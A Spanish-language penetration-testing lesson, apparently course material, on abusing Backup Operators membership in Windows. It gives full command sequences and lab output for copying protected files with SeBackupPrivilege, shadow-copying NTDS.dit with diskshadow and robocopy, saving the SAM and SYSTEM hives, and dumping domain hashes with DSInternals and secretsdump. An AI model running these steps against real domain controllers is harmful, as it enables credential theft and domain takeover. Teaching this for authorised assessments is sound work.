Como se menciona en la sección `Windows Privileges Overview`, los servidores de Windows, y especialmente los Domain Controllers, tienen una variedad de grupos integrados que vienen con el sistema operativo o se agregan cuando se instala el rol de Active Directory Domain Services en un sistema para promover un servidor a un Domain Controller. Muchos de estos grupos otorgan privilegios especiales a sus miembros, y algunos pueden ser utilizados para escalar privilegios en un servidor o un Domain Controller. [Aquí](https://ss64.com/nt/syntax-security_groups.html) hay una lista de todos los grupos integrados de Windows junto con una descripción detallada de cada uno. Esta [página](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) tiene una lista detallada de cuentas y grupos privilegiados en Active Directory. Es esencial entender las implicaciones de la membresía en cada uno de estos grupos, ya sea que obtengamos acceso a una cuenta que sea miembro de uno de ellos o notemos membresías excesivas/innecesarias en uno o más de estos grupos durante una evaluación. Para nuestros propósitos, nos enfocaremos en los siguientes grupos integrados. Cada uno de estos grupos existe en sistemas desde Server 2008 R2 hasta el presente, excepto Hyper-V Administrators (introducido con Server 2012).

Las cuentas pueden asignarse a estos grupos para imponer el principio de menor privilegio y evitar crear más Domain Admins y Enterprise Admins para realizar tareas específicas, como respaldos (backups). A veces, las aplicaciones de proveedores también requerirán ciertos privilegios, que pueden otorgarse asignando una cuenta de servicio a uno de estos grupos. Las cuentas también pueden agregarse por accidente o quedar después de probar una herramienta o script específico. Siempre debemos revisar estos grupos e incluir una lista de los miembros de cada grupo como un apéndice en nuestro informe para que el cliente revise y determine si el acceso sigue siendo necesario.

| Grupo                                                                                                                                                                     | Grupo                                                                                                                                                           | Grupo                                                                                                                                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)            | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)              |
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)    | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

---

## Backup Operators

Después de aterrizar en una máquina, podemos usar el comando `whoami /groups` para mostrar nuestras membresías actuales en grupos. Examinemos el caso donde somos miembros del grupo `Backup Operators`. La membresía de este grupo otorga a sus miembros los privilegios `SeBackup` y `SeRestore`. El [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) nos permite atravesar cualquier carpeta y listar el contenido de la carpeta. Esto nos permitirá copiar un archivo desde una carpeta, incluso si no hay una entrada de control de acceso (ACE) para nosotros en la lista de control de acceso (ACL) de la carpeta. Sin embargo, no podemos hacer esto usando el comando de copia estándar. En su lugar, necesitamos copiar los datos de forma programática, asegurándonos de especificar el flag [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea).

Podemos usar este [PoC](https://github.com/giuliano108/SeBackupPrivilege) para explotar el `SeBackupPrivilege` y copiar este archivo. Primero, importemos las bibliotecas en una sesión de PowerShell.

### Importing Libraries

```r
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### Verifying SeBackupPrivilege is Enabled

Verifiquemos si `SeBackupPrivilege` está habilitado invocando `whoami /priv` o el cmdlet `Get-SeBackupPrivilege`. Si el privilegio está deshabilitado, podemos habilitarlo con `Set-SeBackupPrivilege`.

Nota: Según la configuración del servidor, puede ser necesario abrir un CMD elevado para evitar UAC y tener este privilegio.

```r
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```r
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

### Enabling SeBackupPrivilege

Si el privilegio está deshabilitado, podemos habilitarlo con `Set-SeBackupPrivilege`.

```r
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

```r
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Copying a Protected File

Como podemos ver arriba, el privilegio se habilitó con éxito. Este privilegio ahora puede ser aprovechado para copiar cualquier archivo protegido.

```r
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

```r
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb>  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

Los comandos anteriores demuestran cómo se accedió a información sensible sin poseer los permisos requeridos.

### Attacking a Domain Controller - Copying NTDS.dit

Este grupo también permite iniciar sesión localmente en un controlador de dominio. La base de datos de Active Directory `NTDS.dit` es un objetivo muy atractivo, ya que contiene los hashes NTLM para todos los objetos de usuario y computadora en el dominio. Sin embargo, este archivo está bloqueado y tampoco es accesible para usuarios sin privilegios.

Como el archivo `NTDS.dit` está bloqueado por defecto, podemos usar la utilidad [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) de Windows para crear una copia sombra del disco `C` y exponerla como disco `E`. El NTDS.dit en esta copia sombra no estará en uso por el sistema.

```r
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

### Copying NTDS.dit Locally

A continuación, podemos usar el cmdlet `Copy-FileSeBackupPrivilege` para evitar el ACL y copiar el NTDS.dit localmente.

```r
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

### Backing up SAM and SYSTEM Registry Hives

El privilegio también nos permite respaldar las colmenas del registro SAM y SYSTEM, de las cuales podemos extraer las credenciales de cuentas locales sin conexión utilizando una herramienta como `secretsdump.py` de Impacket.

```r
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

Vale la pena señalar que si una carpeta o archivo tiene una entrada de denegación explícita para nuestro usuario actual o un grupo al que pertenecen, esto nos impedirá acceder a él, incluso si se especifica el flag `FILE_FLAG_BACKUP_SEMANTICS`.

### Extracting Credentials from NTDS.dit

Con el NTDS.dit extraído, podemos usar una herramienta como `secretsdump.py` o el módulo de PowerShell `DSInternals` para extraer todas las credenciales de cuenta de Active Directory. Obtengamos el hash NTLM solo para la cuenta `administrator` del dominio usando `DSInternals`.

```r
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:
```

### Extracting Hashes Using SecretsDump

También podemos usar `SecretsDump` sin conexión para extraer hashes del archivo `ntds.dit` obtenido anteriormente. Estos pueden ser utilizados para pass-the-hash y acceder a recursos adicionales o ser descifrados sin conexión utilizando `Hashcat` para obtener más acceso. Si se descifran, también podemos presentar al cliente estadísticas de descifrado de contraseñas para proporcionarles una visión detallada de la fortaleza y el uso general de contraseñas dentro de su dominio y proporcionar recomendaciones para mejorar su política de contraseñas (aumentar la longitud mínima, crear un diccionario de palabras no permitidas, etc.).

```r
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

<SNIP>
```

---

## Robocopy

### Copying Files with Robocopy

La utilidad incorporada [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) también se puede usar para copiar archivos en modo de respaldo. Robocopy es una herramienta de línea de comandos para la replicación de directorios. Se puede usar para crear trabajos de respaldo e incluye características como copiado en múltiples hilos, reintento automático, la capacidad de reanudar la copia y más. Robocopy se diferencia del comando `copy` en que, en lugar de solo copiar todos los archivos, puede verificar el directorio de destino y eliminar los archivos que ya no están en el directorio de origen. También puede comparar archivos antes de copiarlos para ahorrar tiempo al no copiar archivos que no han cambiado desde la última vez que se ejecutó el trabajo de copia/respaldo.

```r
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

Esto elimina la necesidad de cualquier herramienta externa.